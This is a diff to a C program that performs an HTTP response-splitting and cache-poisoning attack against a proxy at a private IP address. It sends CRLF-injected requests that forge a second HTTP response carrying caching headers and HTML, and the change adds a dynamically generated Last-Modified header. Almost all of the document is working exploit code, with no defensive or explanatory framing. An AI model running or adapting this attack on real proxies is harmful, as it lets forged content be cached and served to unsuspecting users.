@@ -3,6 +3,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <time.h>
 
 #define PROXY_IP "192.168.1.202" // Proxy server IP
 #define PROXY_PORT 8080          // Proxy server port
@@ -14,7 +15,7 @@ void send_http_response_splitting_attack() {
     char attack_request[1024];
     char proxy_response[1024];
 
-     snprintf(attack_request, sizeof(attack_request),
+    snprintf(attack_request, sizeof(attack_request),
          "GET /cgi-bin/course_selector HTTP/1.1\r\n"
          "Host:192.168.1.202\r\n"
          "Content-Type:application/x-www-form-urlencoded\r\n"
@@ -25,7 +26,6 @@ void send_http_response_splitting_attack() {
          strlen("course_id=67607%0d%0aConnection:%20Keep-Alive%0d%0a%0d%0a"
                 "HTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a"
                 "Content-Length:%2020%0d%0a%0d%0a<html>212973481</html>"));
-
 
     // Create a socket
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -57,11 +57,9 @@ void send_http_response_splitting_attack() {
         close(sockfd);
         exit(EXIT_FAILURE);
     }
-    
-    
 
     printf("Malicious attack_request sent to the proxy.\n");
-    
+
     // Receive the response from the proxy server
     ssize_t bytes_received = recv(sockfd, proxy_response, sizeof(proxy_response) - 1, 0);
     if (bytes_received < 0) {
@@ -69,9 +67,12 @@ void send_http_response_splitting_attack() {
         close(sockfd);
         exit(EXIT_FAILURE);
     }
-    
 
-
+    // Get the current GMT time
+    time_t now = time(NULL);
+    struct tm *gmt = gmtime(&now);
+    char last_modified[128];
+    strftime(last_modified, sizeof(last_modified), "Last-Modified: %a, %d %b %Y %H:%M:%S GMT", gmt);
 
     char injected2_response[RESPONSE_BUFFER_SIZE];
 
@@ -84,26 +85,24 @@ void send_http_response_splitting_attack() {
             
             // Second response
             "HTTP/1.1%%20200%%20OK%%0d%%0a"
-            
-            "Last-Modified:%%20Sun,%%2019%%20Jan%%202025%%2019:07:00%%20GMT%%0d%%0a"
+            "%s%%0d%%0a"  // Inject dynamically generated Last-Modified field
             "Content-Type:%%20text/html%%0d%%0a"
-            "Content-Length:%%2039%%0d%%0a" // Matches "212973481" content size
+            "Content-Length:%%2039%%0d%%0a"
             "Cache-Control:%%20public,%%20max-age=3600%%0d%%0a"
             "<!DOCTYPE%%20html>%%20<html>212973481</html>"
             "Connection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
-            "HTTP/1.1\r\nHost: 192.168.1.202:8080\r\nConnection: Keep-Alive\r\n\r\n"
+            "HTTP/1.1\r\nHost: 192.168.1.202:8080\r\nConnection: Keep-Alive\r\n\r\n",
+            last_modified
     );
 
-         
     if (send(sockfd, injected2_response, strlen(injected2_response), 0) < 0) {
         perror("Failed to send combined_response");
         close(sockfd);
         exit(EXIT_FAILURE);
     }
 
-
-
     printf("Combined normal and injected responses sent to the proxy.\n");
+
     // Close the socket
     close(sockfd);
 }
@@ -112,6 +111,3 @@ int main() {
     send_http_response_splitting_attack();
     return 0;
 }
-
-
-
